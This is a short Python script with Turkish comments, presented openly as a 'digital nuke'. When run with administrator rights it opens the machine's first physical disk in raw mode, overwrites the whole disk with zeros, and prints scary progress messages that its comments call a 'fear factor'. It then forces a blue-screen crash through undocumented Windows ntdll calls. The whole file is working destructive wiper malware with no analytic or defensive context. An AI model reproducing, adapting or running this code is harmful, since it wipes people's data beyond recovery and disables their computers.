import sys
import ctypes
import os

# --- KIYAMET SENARYOSU (PİM YOK) ---
# DİKKAT: Bu kod harddiski fiziksel olarak "SIFIRLAR". Veri kurtarma imkansızdır.

def trigger_bsod():
    # İş bittikten sonra (veya işlem sırasında) Mavi Ekran verdir
    # Windows'un kendi API'sini kullanarak sistemi çökertir (Critical Process Died)
    print("💀 SİSTEM FİŞİ ÇEKİLİYOR...")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000221, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def digital_nuke():
    print("--- DIGITAL NUKE BAŞLATILIYOR (TOTAL DESTRUCTION) ---")
    print("Hedef: Fiziksel Disk 0 (Tüm Harddisk)")
    
    drive_path = r"\\.\PhysicalDrive0"
    buffer_size = 1024 * 1024  # 1 MB'lık devasa silgilerle sil
    chunk = b'\x00' * buffer_size # Sadece '0'lardan oluşan ölümcül veri
    
    try:
        # 1. DİSKİ DONANIM MODUNDA AÇ
        with open(drive_path, "r+b") as disk:
            print("[!] DİSK ERİŞİMİ SAĞLANDI. SİLME BAŞLIYOR...")
            
            sector = 0
            while True:
                try:
                    # 2. HER ŞEYİ SIFIRLA (ÜZERİNE YAZ)
                    disk.write(chunk)
                    
                    # Kullanıcıyı bilgilendir (Korku faktörü)
                    if sector % 100 == 0:
                        print(f"🔥 YAKILAN ALAN: {sector} MB [Kurtarılamaz]")
                    sector += 1
                    
                except Exception:
                    # Disk sonuna gelince veya Windows çökmeye başlayınca dur
                    break
                    
            print("💀 DİSK TAMAMEN SİLİNDİ. İŞLETİM SİSTEMİ ARTIK YOK.")
            
    except PermissionError:
        print("[-] Yönetici izni yok! (PC şimdilik kurtuldu)")
    except Exception as e:
        # Disk silinirken Windows dosyaları kaybolacağı için sistem zaten çökecek
        print(f"Sistem eriyor... Hata: {e}")
        
    # 3. SON VURUŞ: MAVİ EKRAN (BSOD)
    trigger_bsod()

if __name__ == "__main__":
    # Yönetici kontrolü
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("!!! BU KODU SADECE YÖNETİCİ ÇALIŞTIRABİLİR !!!")
    else:
        # Uyarı: Bu kodun dönüşü yoktur.
        digital_nuke()